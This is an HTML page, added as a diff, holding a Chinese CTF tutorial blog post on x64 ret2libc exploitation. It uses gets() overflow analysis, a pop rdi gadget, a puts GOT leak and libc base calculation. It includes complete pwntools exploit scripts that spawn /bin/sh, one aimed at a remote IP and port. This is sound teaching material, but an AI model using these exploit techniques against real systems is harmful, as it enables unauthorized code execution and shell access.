@@ -1,0 +1,330 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PWN从入门到放弃(10)——栈溢出之ret2libc(x64) | 山深有杏&#39;s Blog</title>
+<link rel="shortcut icon" href="https://ssyxsec.com/favicon.ico?v=1735101861265">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ssyxsec.com/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PWN从入门到放弃(10)——栈溢出之ret2libc(x64) | 山深有杏&#39;s Blog - Atom Feed" href="https://ssyxsec.com/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前面我们介绍了32位elf程序ret2libc的利用方法
+本篇我们介绍一下64位的ret2libc
+0x00 例题
+1）查看文件信息
+$ file ret2libc
+$ checksec ret2libc
+
+
+2）查看程序流程
+运行一下程序..." />
+    <meta name="keywords" content="CTF,Pwn" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ssyxsec.com">
+  <img class="avatar" src="https://ssyxsec.com/images/avatar.png?v=1735101861265" alt="">
+  </a>
+  <h1 class="site-title">
+    山深有杏&#39;s Blog
+  </h1>
+  <p class="site-description">
+    These Violent Delights Have Violent Ends.
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://ssyxsec.com/0mQfqrf6-n" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PWN从入门到放弃(10)——栈溢出之ret2libc(x64)
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-11-07
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://ssyxsec.com/tag/mFiLVoNunh/" class="post-tag">
+                  # CTF
+                </a>
+              
+                <a href="https://ssyxsec.com/tag/BcBYBpcwgI/" class="post-tag">
+                  # Pwn
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>前面我们介绍了32位elf程序ret2libc的利用方法</p>
+<p>本篇我们介绍一下64位的ret2libc</p>
+<h3 id="0x00-例题">0x00 例题</h3>
+<h4 id="1查看文件信息">1）查看文件信息</h4>
+<pre><code class="language-javascript">$ file ret2libc
+$ checksec ret2libc
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730959719773.png" alt="" loading="lazy"></figure>
+<h4 id="2查看程序流程">2）查看程序流程</h4>
+<p>运行一下程序，看看程序的大概流程</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730959727131.png" alt="" loading="lazy"></figure>
+<p>程序提供一次输入一次输出</p>
+<h4 id="3分析程序查找漏洞点">3）分析程序&amp;查找漏洞点</h4>
+<p>将程序扔到ida pro里分析</p>
+<p>首先分析main()函数</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730959732955.png" alt="" loading="lazy"></figure>
+<p>我们看到，程序使用了gets函数和puts函数，根据我们之前讲过的ret2libc，攻击思路还是很清晰的</p>
+<p>这里gets()函数是存在溢出的，我们可以利用这个溢出，构造一个puts()函数，将函数实际地址打印出来</p>
+<p>然后利用puts函数的实际地址计算出libc基地址，再计算system函数和binsh的地址</p>
+<h4 id="4构造payload">4）构造payload</h4>
+<p>首先构造第一段payload</p>
+<p>这里需要注意，64位程序和32位程序有比较大的区别，32位程序函数参数是通过栈来传参，我们只需要构造一个栈结构即可；64位程序函数参数是通过寄存器来传参，因此，我们需要用到ROPgadget来给寄存器赋值</p>
+<p>64位程序传递参数的寄存器一共有六个，如果函数参数大于六个，后面的参数才会入栈，寄存器传参顺序为：<code>$rdi $</code>rsi <code>$rdx $</code>rcx <code>$r8 $</code>r9</p>
+<p>因为我们脚本需要用到的函数为puts和system，这两个函数都只有一个参数，因此我们只需要rdi寄存器即可</p>
+<p>我们利用ROPgadget工具来查找ROP片段</p>
+<pre><code class="language-javascript">$ ROPgadget --binary ret2libc
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730959740996.png" alt="" loading="lazy"></figure>
+<p>我们找到pop rdi ; ret，将其地址复制出来</p>
+<p>构造函数的顺序为，溢出偏移+pop rdi ; ret+参数+函数地址+函数返回地址</p>
+<p>注：这里因为程序只有一次输入输出，所以我们返回地址填上main函数的地址，当我们构造的函数执行完后，会返回到main函数继续执行。</p>
+<p>第一段payload如下</p>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./ret2libc')
+elf = ELF('./ret2libc')
+
+padding = 120
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = 0x400666
+pop_rdi_ret = 0x0400753
+
+payload = 'a' * padding
+payload += p64(pop_rdi_ret)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_addr)
+
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+<p>我们运行脚本，程序就会将puts函数的实际地址给我们打印出来</p>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730959747889.png" alt="" loading="lazy"></figure>
+<p>我们通过recvline方法来接收</p>
+<pre><code class="language-javascript">r.recvline()
+puts_real = u64(r.recvline()[:-1].ljust(8,'\x00'))
+</code></pre>
+<p>第一个r.recvline()用来接收程序给我们打印的数据，第二个r.recvline用来接收puts函数的实际地址，这里用[:-1]来截取掉后面的’\n’，用.ljust(8,’\x00′)将长度填充为8，因为64位程序的地址长度为8</p>
+<p>当我们成功获取到puts函数的实际地址后，即可将本地调试改成远程调试，将远程服务器上的程序puts函数实际地址泄露出来，然后根据puts函数的实际地址来查找远程服务器上所使用的libc库版本</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730959754074.png" alt="" loading="lazy"></figure>
+<p>这里我们看到，远程调试时，puts函数实际地址的后三位为6a0，那么我们上网查一下，戳这里☞<a href="https://libc.blukat.me/">libc database search</a></p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730959759067.png" alt="" loading="lazy"></figure>
+<p>我们找到对应版本的libc库，即可下载</p>
+<p>注：64位程序选择amd64的库，32位程序选择i386的库</p>
+<p>我们将对应库下载下来，放到程序文件夹下，重命名位libc.so，并将其导入脚本</p>
+<pre><code class="language-javascript">libc = ELF('./libc.so')
+</code></pre>
+<p>然后可根据公式来计算出libc的基地址和system函数以及binsh的地址</p>
+<pre><code class="language-javascript">libc_base = puts_real - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + libc.search('/bin/sh').next()
+</code></pre>
+<p>这里一般会将libc_base的值打印出来，如果后三位是0，那么证明我们计算的是没有问题的</p>
+<p>那么现在我们可以继续构造第二段payload了</p>
+<pre><code class="language-javascript">payload2 = 'a' * padding
+payload2 += p64(pop_rdi_ret)
+payload2 += p64(bin_sh_addr)
+payload2 += p64(system_addr)
+payload2 += p64(0xdeadbeef)
+
+sleep(1)
+r.sendline(payload2)
+</code></pre>
+<h3 id="0x01-完整exp">0x01 完整exp</h3>
+<pre><code class="language-javascript">from pwn import *
+
+#r = process('./ret2libc')
+r = remote('123.56.83.100',6102)
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = ELF('./libc.so')
+elf = ELF('./ret2libc')
+
+padding = 120
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = 0x400666
+pop_rdi_ret = 0x0400753
+
+payload = 'a' * padding
+payload += p64(pop_rdi_ret)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_addr)
+
+r.sendline(payload)
+
+r.recvline()
+puts_real = u64(r.recvline()[:-1].ljust(8,'\x00'))
+print hex(puts_real)
+
+libc_base = puts_real - libc.symbols['puts']
+print hex(libc_base)
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + libc.search('/bin/sh').next()
+
+payload2 = 'a' * padding
+payload2 += p64(pop_rdi_ret)
+payload2 += p64(bin_sh_addr)
+payload2 += p64(system_addr)
+payload2 += p64(0xdeadbeef)
+
+sleep(1)
+r.sendline(payload2)
+
+r.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x00-%E4%BE%8B%E9%A2%98">0x00 例题</a>
+<ul>
+<li><a href="#1%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF">1）查看文件信息</a></li>
+<li><a href="#2%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B">2）查看程序流程</a></li>
+<li><a href="#3%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%82%B9">3）分析程序&amp;查找漏洞点</a></li>
+<li><a href="#4%E6%9E%84%E9%80%A0payload">4）构造payload</a></li>
+</ul>
+</li>
+<li><a href="#0x01-%E5%AE%8C%E6%95%B4exp">0x01 完整exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ssyxsec.com/D57Njc4g0n/">
+              <h3 class="post-title">
+                PWN从入门到放弃(9)——格式化字符串漏洞（x64）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ssyxsec.com/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
